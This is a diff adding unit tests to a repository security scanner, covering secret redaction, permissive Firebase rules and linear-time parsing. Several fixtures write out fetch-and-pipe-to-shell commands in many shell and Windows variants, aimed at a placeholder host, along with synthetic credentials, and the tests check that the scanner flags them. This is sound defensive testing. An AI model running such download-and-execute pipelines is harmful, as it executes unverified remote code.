@@ -189,6 +189,10 @@ class PreflightTests(unittest.TestCase):
         synthetic_value = "!DUMMY_SECRET_VALUE_123"
         filename = f"token={synthetic_value}"
         fixture.write(filename, f"token={synthetic_value}\n")
+        fixture.write(
+            "password" + ("A" * 129) + f"={synthetic_value}.txt",
+            f"password={synthetic_value}\n",
+        )
 
         for output_format in ("text", "json", "sarif"):
             with self.subTest(output_format=output_format):
@@ -207,12 +211,21 @@ class PreflightTests(unittest.TestCase):
             with self.subTest(variable_name=variable_name):
                 fixture = RepositoryFixture(self)
                 synthetic_value = "!PrivilegedSyntheticValue123456789"
+                long_variable_name = (
+                    "NEXT_PUBLIC_" + ("A" * 129) + "ADMIN_KEY"
+                    if variable_name == "NEXT_PUBLIC_ADMIN_KEY"
+                    else "SUPABASE_" + ("A" * 129) + "_SERVICE_ROLE_KEY"
+                )
                 fixture.write(
                     f"{variable_name}={synthetic_value}",
                     f"{variable_name}={synthetic_value}\n",
                 )
                 fixture.write(
                     f"{variable_name}=/{synthetic_value}",
+                    f"{variable_name}={synthetic_value}\n",
+                )
+                fixture.write(
+                    f"{long_variable_name}={synthetic_value}.txt",
                     f"{variable_name}={synthetic_value}\n",
                 )
 
@@ -292,6 +305,65 @@ class PreflightTests(unittest.TestCase):
         self.assertEqual(1, len(env_findings))
         self.assertEqual("VW-ENV-UNIGNORED", env_findings[0]["rule_id"])
         self.assertEqual(".env.production", env_findings[0]["path"])
+
+    @unittest.skipIf(os.name == "nt", "Git magic path fixture uses POSIX filename semantics")
+    def test_req_011_git_scope_uses_literal_pathspecs_for_magic_names_and_root(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write("root.txt", "ordinary tracked source\n")
+        magic_targets = [
+            fixture.write(
+                f":({magic})scope/config.txt",
+                "pass" + f"word=!Synthetic{magic.title()}PathSecret123\n",
+            ).parent
+            for magic in ("literal", "icase", "glob")
+        ]
+        fixture.track("root.txt")
+
+        root_completed = self.run_scanner(fixture.root)
+        root_report = self.json_report(root_completed)
+        self.assertEqual(1, root_completed.returncode)
+        self.assertEqual("git-worktree", root_report["scope"]["mode"])
+        self.assertEqual(4, root_report["summary"]["files_considered"])
+
+        for magic_target in magic_targets:
+            with self.subTest(target=magic_target.name):
+                target_completed = self.run_scanner(magic_target)
+                target_report = self.json_report(target_completed)
+                self.assertEqual(1, target_completed.returncode)
+                self.assertEqual([], target_report["tool_errors"])
+                self.assertEqual(
+                    {"VW-SECRET-GENERIC-ASSIGNMENT"},
+                    {finding["rule_id"] for finding in target_report["findings"]},
+                )
+                self.assertEqual(
+                    {"config.txt"},
+                    {finding["path"] for finding in target_report["findings"]},
+                )
+
+    def test_req_007_long_secret_like_path_remainder_is_fully_redacted(self) -> None:
+        scanner = load_scanner_module()
+        secret = "!Synthetic" + "PathCredential123456789"
+        raw_path = ("segment/" * 500) + f"password=/{secret}/tail.txt"
+
+        self.assertGreater(len(raw_path), 4_000)
+        self.assertLessEqual(len(raw_path), 4_096)
+        started = time.perf_counter()
+        safe_path = scanner._safe_display_component(raw_path)
+        elapsed = time.perf_counter() - started
+
+        self.assertLess(elapsed, 1.0, f"path redaction took {elapsed:.3f}s")
+        self.assertNotIn(secret, safe_path)
+        self.assertNotIn("tail.txt", safe_path)
+        self.assertTrue(safe_path.endswith("password=[REDACTED]"))
+
+        for raw_name in (
+            "password" + ("A" * 129) + f"={secret}.txt",
+            "NEXT_PUBLIC_" + ("A" * 129) + f"ADMIN_KEY={secret}.txt",
+        ):
+            with self.subTest(raw_name=raw_name[:24]):
+                safe_name = scanner._safe_display_component(raw_name)
+                self.assertNotIn(secret, safe_name)
+                self.assertIn("[REDACTED]", safe_name)
 
     def test_req_008_contextual_backend_keys_and_privileged_key(self) -> None:
         fixture = RepositoryFixture(self)
@@ -422,6 +494,69 @@ class PreflightTests(unittest.TestCase):
         ]
         self.assertEqual(3, len(findings))
 
+    def test_req_008_firebase_comments_parentheses_and_string_spacing_are_normalized(self) -> None:
+        fixture = RepositoryFixture(self)
+        fixture.write(
+            "firestore.rules",
+            "// allow read: if true;\n"
+            "/* allow write: if true; */\n"
+            "allow /* operation */ read, write: if (((true))) // explanation\n"
+            ";\n",
+        )
+        fixture.write(
+            "database.rules.json",
+            '{"url": "https://invalid.example/a/*literal*/", '
+            '".read" /* explanation */ : "(( true   == true ))"}\n',
+        )
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+
+        self.assertEqual(1, completed.returncode)
+        findings = [
+            finding
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
+        ]
+        self.assertEqual(2, len(findings))
+        self.assertEqual(
+            {"database.rules.json", "firestore.rules"},
+            {finding["path"] for finding in findings},
+        )
+
+    def test_req_008_firebase_parenthesis_scan_is_unbounded_and_linear(self) -> None:
+        scanner = load_scanner_module()
+        candidate = scanner.Candidate(
+            Path("firestore.rules"),
+            "firestore.rules",
+            None,
+            b"firestore.rules",
+        )
+        parentheses = 65_536
+        text = "allow read: if " + ("(" * parentheses) + "true" + (")" * parentheses) + ";"
+        findings: list[object] = []
+
+        started = time.perf_counter()
+        scanner._scan_text(candidate, text, findings)
+        elapsed = time.perf_counter() - started
+
+        self.assertLess(elapsed, 1.0, f"Firebase parenthesis scan took {elapsed:.3f}s")
+        self.assertEqual(
+            ["VW-FIREBASE-PERMISSIVE-RULE"],
+            [finding.rule_id for finding in findings],
+        )
+
+        failed_findings: list[object] = []
+        started = time.perf_counter()
+        scanner._scan_text(candidate, text[:-1] + "X", failed_findings)
+        failed_elapsed = time.perf_counter() - started
+        self.assertLess(
+            failed_elapsed,
+            1.0,
+            f"failing Firebase parenthesis scan took {failed_elapsed:.3f}s",
+        )
+        self.assertEqual([], failed_findings)
+
     def test_req_008_explicitly_disabled_supabase_rls_blocks(self) -> None:
         fixture = RepositoryFixture(self)
         fixture.write(
@@ -544,6 +679,65 @@ class PreflightTests(unittest.TestCase):
         ]
         self.assertEqual({1, 2, 3, 4}, {finding["line"] for finding in findings})
 
+    def test_req_009_shell_c_text_is_only_scanned_when_the_shell_executes(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        shell = "ba" + "sh"
+        nested = f"{fetcher} https://invalid.example/install | {shell}"
+        fixture.write(
+            "commands.sh",
+            f"echo sh -c '{nested}'\n"
+            f"printf '%s' sh -c '{nested}'\n"
+            f"echo safe; sh -c '{nested}'\n",
+        )
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+
+        self.assertEqual(1, completed.returncode)
+        findings = [
+            finding
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
+        ]
+        self.assertEqual([3], [finding["line"] for finding in findings])
+
+    def test_req_009_shell_redirections_options_substitutions_and_windows_forms_block(self) -> None:
+        fixture = RepositoryFixture(self)
+        fetcher = "cu" + "rl"
+        shell = "ba" + "sh"
+        nested = f"{fetcher} https://invalid.example/install | {shell}"
+        fixture.write(
+            "variants.sh",
+            f"{fetcher} https://invalid.example/redirect 2>&1 | {shell}\n"
+            f"env -- {shell} --rcfile synthetic.rc --noprofile -O extglob -c -- '{nested}'\n"
+            f"cat <({nested})\n"
+            f"cat >({nested})\n"
+            f'"C:\\Tools\\{fetcher}.exe" https://invalid.example/windows | '
+            f'"C:\\Tools\\{shell}.exe"\n'
+            f"C:\\Tools\\{fetcher}.exe https://invalid.example/windows-unquoted | "
+            f"C:\\Tools\\{shell}.exe\n"
+            f'cmd.exe /c "{fetcher}.exe https://invalid.example/cmd | {shell}.exe"\n'
+            f'echo "<({nested})"\n'
+            f"printf '%s' '{nested}'\n"
+            f"echo {'x' * 10_000} {nested}\n",
+        )
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+
+        self.assertEqual(1, completed.returncode)
+        findings = [
+            finding
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
+        ]
+        self.assertEqual({1, 2, 3, 4, 5, 6, 7}, {finding["line"] for finding in findings})
+        self.assertNotIn(
+            "VW-SHELL-PIPELINE-UNPARSED",
+            {finding["rule_id"] for finding in report["findings"]},
+        )
+
     def test_req_009_independent_lines_do_not_form_remote_pipeline(self) -> None:
         fixture = RepositoryFixture(self)
         fetcher = "cu" + "rl"
@@ -564,7 +758,7 @@ class PreflightTests(unittest.TestCase):
             {finding["rule_id"] for finding in report["findings"]},
         )
 
-    def test_req_009_shell_tokenization_budget_is_bounded_and_fails_closed(self) -> None:
+    def test_req_009_shell_tokenization_is_linear_and_malformed_syntax_fails_closed(self) -> None:
         fixture = RepositoryFixture(self)
         fetcher = "cu" + "rl"
         shell = "ba" + "sh"
@@ -587,10 +781,13 @@ class PreflightTests(unittest.TestCase):
             for finding in report["findings"]
             if finding["rule_id"] == "VW-SHELL-PIPELINE-UNPARSED"
         ]
-        self.assertEqual(
-            {"long-pipeline.txt", "malformed-pipeline.txt"},
-            {finding["path"] for finding in unparsed},
-        )
+        self.assertEqual({"malformed-pipeline.txt"}, {finding["path"] for finding in unparsed})
+        remote = [
+            finding
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
+        ]
+        self.assertEqual({"long-pipeline.txt"}, {finding["path"] for finding in remote})
 
     def test_req_009_plain_megabyte_scan_is_linear(self) -> None:
         fixture = RepositoryFixture(self)
@@ -654,6 +851,32 @@ class PreflightTests(unittest.TestCase):
             {finding["rule_id"] for finding in report["findings"]},
         )
         self.assertNotIn(synthetic_value, completed.stdout)
+
+    def test_req_009_generic_assignment_scan_is_linear_without_value_evidence(self) -> None:
+        scanner = load_scanner_module()
+        candidate = scanner.Candidate(Path("config.txt"), "config.txt", None, b"config.txt")
+        synthetic_value = "!LinearSyntheticCredential123456789"
+        text = ("ordinary_name_" * 50_000) + f"password={synthetic_value}"
+        findings: list[object] = []
+
+        started = time.perf_counter()
+        scanner._scan_text(candidate, text, findings)
+        elapsed = time.perf_counter() - started
+        rendered = json.dumps([finding.as_dict() for finding in findings])
+
+        self.assertLess(elapsed, 1.5, f"generic assignment scan took {elapsed:.3f}s")
+        self.assertEqual(
+            ["VW-SECRET-GENERIC-ASSIGNMENT"],
+            [finding.rule_id for finding in findings],
+        )
+        self.assertNotIn(synthetic_value, rendered)
+
+        clean_findings: list[object] = []
+        started = time.perf_counter()
+        scanner._scan_text(candidate, "token" * 150_000, clean_findings)
+        clean_elapsed = time.perf_counter() - started
+        self.assertLess(clean_elapsed, 1.5, f"generic clean scan took {clean_elapsed:.3f}s")
+        self.assertEqual([], clean_findings)
 
     @unittest.skipIf(os.name == "nt", "Git fsmonitor hook execution regression uses a POSIX hook")
     def test_req_010_repository_fsmonitor_hook_is_never_executed(self) -> None:
